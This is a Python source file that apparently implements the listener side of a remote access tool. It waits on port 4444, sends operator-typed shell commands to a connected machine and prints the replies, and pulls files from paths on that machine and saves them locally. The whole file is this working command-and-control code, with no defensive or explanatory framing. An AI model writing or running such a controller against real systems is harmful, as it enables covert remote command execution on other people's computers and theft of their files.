import socket
class Server_tools:
    def __init__(self):
        self.mssg = ""
    def conf(self):
        self.host = "localhost"
        self.port = 4444
    def sck(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.bind((self.host, self.port))
        print ("waiting ...")
        self.s.listen()
        self.c, self.addr = self.s.accept()
    def dashboard(self):
        print ("connected ... ",self.addr)
        print("")
        print ("1 - Terminal")
        print ("2 - File manager")
        print ("3 - exit")
        self.choice = input("> ")
        self.c.send(self.choice.encode())
        
    def terminal(self):
        self.mssg = ""
        while self.mssg != 'e':
          self.mssg = input("terminal$ ")
          self.c.sendall((self.mssg).encode())
          self.data = self.c.recv(1024)
          print (self.data.decode())
    def filemanager(self):
        while self.mssg != 'e':
          self.f_p = input("Path :")
          self.c.send(self.f_p.encode())
          self.f = self.c.recv(10024)
          self.f_n = input("Name :")
          self.n_f = open(self.f_n,'wb')
          self.n_f.write(self.f)
          self.n_f.close()
          print ("Done !")
    def logout(self):
        print("Goodbye ...")   
        self.s.close()
T = Server_tools()